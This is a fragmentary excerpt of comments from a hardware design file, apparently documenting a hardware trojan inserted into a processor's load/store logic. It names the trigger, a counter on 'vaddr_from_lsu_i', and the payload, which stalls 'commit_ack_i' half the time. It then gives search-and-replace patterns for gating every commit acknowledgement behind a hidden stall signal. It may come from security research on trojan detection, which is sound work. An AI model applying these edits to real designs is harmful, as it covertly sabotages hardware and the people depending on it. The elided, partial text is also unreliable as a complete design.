 ...
 *   
 * Trigger: Counter on vaddr_from_lsu_i
 * Payload: Stall commit_ack_i periodically (50% throughput reduction)
 * 
...
// ============================================================
// Performance Degradation: Block commit_ack_i during stall windows.
//
...
//   Find all conditions using commit_ack_i, e.g.:
//     if (commit_ack_i) begin
//     else if (commit_ack_i) begin
//     end else if (commit_ack_i) begin
//   Replace each with:
//     if (commit_ack_i && !stall_active) begin
//     else if (commit_ack_i && !stall_active) begin
//     end else if (commit_ack_i && !stall_active) begin
//
...
//   commit_ack_i is blocked for 8 out of every 16 cycles.
